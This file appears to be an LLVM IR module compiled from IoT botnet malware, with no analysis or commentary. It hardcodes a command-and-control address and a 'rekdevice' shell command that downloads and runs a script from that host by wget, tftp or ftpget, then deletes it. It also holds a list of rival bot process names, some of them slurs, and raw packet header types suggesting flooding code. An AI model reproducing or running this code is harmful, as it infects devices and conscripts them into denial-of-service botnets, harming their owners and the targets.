; ModuleID = 'host/ir_bcf/Lulz.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct.query = type { i16, i16 }
%struct.ps_hdr = type { i32, i32, i8, i8, i16 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.7, %union.anon.8 }
%union.anon.7 = type { [16 x i8] }
%union.anon.8 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@cncServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@rekdevice = global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@knownBots = global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
